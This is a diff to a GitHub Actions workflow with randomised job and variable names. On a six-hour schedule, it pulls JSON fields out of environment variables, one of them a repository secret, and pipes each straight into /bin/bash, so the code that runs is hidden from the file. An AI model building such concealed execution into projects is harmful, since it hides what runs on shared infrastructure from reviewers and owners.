@@ -1,27 +1,29 @@
 name: yanshanxi4376
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
+    - cron: '40 3/6 * * *'
 
-jobs:  # 1706
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanshanxi4376
         env:
-          p8365: ${{ secrets.p8365 }}
+          ltw4423: ${{ secrets.ltw4423 }}
         run: |
-          echo $p8365 | jq -r .zrio0 | /bin/bash
-          echo $dpx53862 | jq -r .cobxg543 | /bin/bash
-          echo $cbp5 | jq -r .fc2338 | /bin/bash
-          echo $lerm06 | jq -r .iiw45286 | /bin/bash
-          echo $sjjjq13 | jq -r .thv33442 | /bin/bash
-          echo $nmh4 | jq -r .sskr35 | /bin/bash
-          echo $m69 | jq -r .vttlj9 | /bin/bash
-          echo $f5987 | jq -r .k04070 | /bin/bash
-          echo $d26 | jq -r .gwuhc94571 | /bin/bash
-          echo $qoag8170 | jq -r .fgal07691 | /bin/bash
-          echo $lpr634 | jq -r .vh9727 | /bin/bash
+          echo $ltw4423 | jq -r .u20230 | /bin/bash
+          echo $dkpw544 | jq -r .fg1 | /bin/bash
+          echo $dty078 | jq -r .hgkz18271 | /bin/bash
+          echo $y89777 | jq -r .o634 | /bin/bash
+          echo $xvw007 | jq -r .gvp08 | /bin/bash
+          echo $ija4 | jq -r .pn9780 | /bin/bash
+          echo $guxee816 | jq -r .bvj3070 | /bin/bash
+          echo $k8778 | jq -r .bv254 | /bin/bash
+          echo $qlnsp68 | jq -r .in3823 | /bin/bash
+          echo $xyhe5477 | jq -r .o857 | /bin/bash
+          echo $vuu3278 | jq -r .npg602 | /bin/bash
 
